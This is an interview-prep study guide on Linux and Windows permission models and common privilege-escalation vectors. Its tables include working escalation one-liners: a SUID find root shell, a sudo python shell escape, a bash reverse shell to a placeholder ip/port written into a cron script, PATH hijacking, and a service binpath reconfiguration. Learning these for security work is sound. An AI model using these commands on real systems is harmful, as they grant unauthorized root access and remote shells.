# File Systems, Permissions & Privilege Escalation Fundamentals

> **Domain:** Core Computer Science  
> **Sub-Domain:** Operating Systems & Access Control  
> **Interview Importance:** Extremely High / Core Red Team & Blue Team Technical Concept  

---

## 1. Topic & Definitions

- **File System:** The operating system structure and indexing mechanism that controls how data is stored, retrieved, named, and organized on disk storage devices (e.g., ext4, XFS, NTFS).
- **Inode (Index Node):** In Unix/Linux, an inode is a filesystem data structure that stores metadata about a file (file size, physical disk block pointers, owner UID, group GID, permissions, timestamps), but notably **does not store the file name or actual content data**.
- **Discretionary Access Control (DAC):** An access control model where the owner of an object (file or directory) has complete discretion to grant or revoke access permissions to other users.
- **Privilege Escalation (PrivEsc):** The act of exploiting a software vulnerability, security design flaw, or configuration error to gain higher privileges (e.g., standard user to `root` on Linux or `NT AUTHORITY\SYSTEM` on Windows) than originally intended by the system administrator.
  - **Vertical Privilege Escalation:** An unprivileged user elevates their account rights to administrative/root level.
  - **Horizontal Privilege Escalation:** A user accesses resources belonging to another user of equivalent permission level.

---

## 2. Linux Permissions & Special Bits Architecture

### 1. Standard Permissions (rwx) & Inode Representation
Every Linux file has 9 permission bits grouped into three tiers: **Owner (User)**, **Group**, and **Others (World)**.

```text
- r w x r - x r - -
│ └──┬──┘ └──┬──┘ └──┬──┘
│    │       │       └── Others: Read (4) = 4
│    │       └────────── Group: Read (4) + Exec (1) = 5
│    └────────────────── Owner: Read (4) + Write (2) + Exec (1) = 7
└─────────────────────── File type: '-' (regular file), 'd' (directory), 'l' (symlink)
```

| Permission | File Meaning | Directory Meaning | Numeric Value |
| :---: | :--- | :--- | :---: |
| **`r` (Read)** | View file contents. | List directory contents (`ls`). | **4** |
| **`w` (Write)**| Modify/overwrite file contents. | Create, delete, or rename files within the directory. | **2** |
| **`x` (Execute)**| Run file as a binary program or script. | Enter/traverse directory (`cd`). | **1** |

### 2. Special Permission Bits: SUID, SGID & Sticky Bit

```text
Special Bits Octal Prefix:
SUID = 4000  |  SGID = 2000  |  Sticky = 1000
```

1. **SUID (Set User ID - `4xxx`):** When executed, the binary executes with the **privileges of the file owner**, not the invoking user.  
   - *Legitimate example:* `/usr/bin/passwd` (owned by root, has permissions `-rwsr-xr-x`). Ordinary users need root privileges temporarily to update their password hash in `/etc/shadow`.
2. **SGID (Set Group ID - `2xxx`):** When set on an executable, it runs with the privileges of the group owner. When set on a directory, files created within it inherit the parent directory's group ownership.
3. **Sticky Bit (`1xxx`):** When set on a directory (e.g., `/tmp` permissions `drwxrwxrwt`), users can write files, but **only the file owner or root can delete or rename** their respective files, preventing users from deleting each other's temporary files.

---

## 3. Windows Security & NTFS Permissions Model

Windows uses an enterprise-grade security model based on Security Identifiers (SIDs) and Access Control Lists:

```text
[ Security Principal: User / Group ] ──► Identified by unique SID (e.g. S-1-5-21-...)
                       │
                       ▼ Requests access to NTFS File/Folder
[ Security Descriptor ]
       │
       ├─ Owner SID
       ├─ SACL (System Access Control List): Governs Auditing and logging
       └─ DACL (Discretionary Access Control List):
             ├─ ACE 1: [Allow] [Alice] [Read, Execute]
             ├─ ACE 2: [Allow] [Domain Admins] [Full Control]
             └─ ACE 3: [Deny]  [Interns] [Write] (Explicit Deny evaluated first!)
```

---

## 4. Linux Privilege Escalation Vectors

| Privilege Escalation Vector | Vulnerability Mechanism | Discovery Command | Exploitation / Remediation |
| :--- | :--- | :--- | :--- |
| **Misconfigured SUID Binaries** | Unintended binaries (e.g. `vim`, `find`, `bash`, `nmap`) having the SUID bit set. | `find / -perm -u=s -type f 2>/dev/null` | Reference **GTFOBins**. If `find` has SUID: `find . -exec /bin/sh -p \; -quit` drops a root shell. |
| **Sudo Misconfiguration (`sudo -l`)** | User granted permission to execute specific binaries as root without password (`NOPASSWD`). | `sudo -l` | If `sudo /usr/bin/python` allowed: `sudo python -c 'import os; os.system("/bin/sh")'`. |
| **Insecure Cron Jobs** | Root cron job running a world-writable script or using relative paths. | Inspect `/etc/crontab`, `/etc/cron.*` | Overwrite the script with a reverse shell payload: `echo "bash -i >& /dev/tcp/ip/port 0>&1" >> script.sh`. |
| **Path Hijacking** | A SUID binary calls a command without an absolute path (e.g. calls `service` instead of `/usr/sbin/service`). | Inspect strings: `strings /opt/binary` | Prepend malicious binary in `/tmp` to `PATH`: `export PATH=/tmp:$PATH`. |
| **Kernel Exploits** | Unpatched kernel flaw allowing memory corruption into Ring 0. | `uname -r` | `Dirty COW` (CVE-2016-5195), `PwnKit` (CVE-2021-4034). Patch kernel regularly! |

---

## 5. Windows Privilege Escalation Vectors

| Vector | Mechanism | Exploitation & Hardening |
| :--- | :--- | :--- |
| **Unquoted Service Paths** | A Windows service binary path contains spaces and lacks quotation marks (e.g., `C:\Program Files\My App\service.exe`). Windows attempts to execute: `C:\Program.exe`, then `C:\Program Files\My.exe`, then the target. | If standard user has write access to `C:\`, dropping `Program.exe` yields `SYSTEM` execution upon service reboot. Wrap all paths in quotes: `"C:\Program Files\My App\service.exe"`. |
| **Insecure Service Permissions** | Service DACL allows low-privileged users to reconfigure binary paths (`SERVICE_CHANGE_CONFIG`). | Reconfigure service binary path via `sc config <name> binpath= "malicious.exe"`. Restrict service DACLs. |
| **AlwaysInstallElevated** | Registry keys `AlwaysInstallElevated` set to `1` under both HKCU and HKLM. | Allows standard users to install Windows Installer (`.msi`) packages with elevated `SYSTEM` privileges. Disable this registry policy. |
| **Token Impersonation (Potato Exploits)** | Service accounts possessing `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`. | Exploits like `JuicyPotato` / `PrintSpoofer` trick the `NT AUTHORITY\SYSTEM` RPC service into authenticating against a local named pipe, capturing and impersonating the token. |

---

## 6. Interview Takeaway: What to Say Under Pressure

### 🎙️ 60-Second Elevator Pitch
> *"Operating system access control relies on Discretionary Access Control (DAC), where files are governed by permissions tied to users and groups. In Linux, files have standard read, write, and execute bits, alongside special bits: SUID, which executes a binary with the owner's privileges; SGID, which runs with the group's privileges; and the Sticky Bit, which restricts file deletion in shared directories like `/tmp`. Privilege escalation occurs vertically when an attacker elevates from an unprivileged account to root or SYSTEM by exploiting configuration oversights—such as misconfigured SUID binaries listed in GTFOBins, sudo NOPASSWD privileges, insecure cron jobs, or unquoted service paths and token impersonation in Windows."*

### ⚠️ Common Traps & Gotchas
- **Trap:** Confusing SUID with standard execute permission.  
  *Correction:* Standard execute runs the program with the **invoking user's** permissions. SUID runs the program with the **file owner's** permissions. If owned by `root`, the invoking user temporarily inherits root access!
- **Trap:** Forgetting what execute (`x`) means on a directory.  
  *Correction:* On a directory, `r` allows listing filenames (`ls`), but `x` is required to **enter** the directory (`cd`) and access files inside.
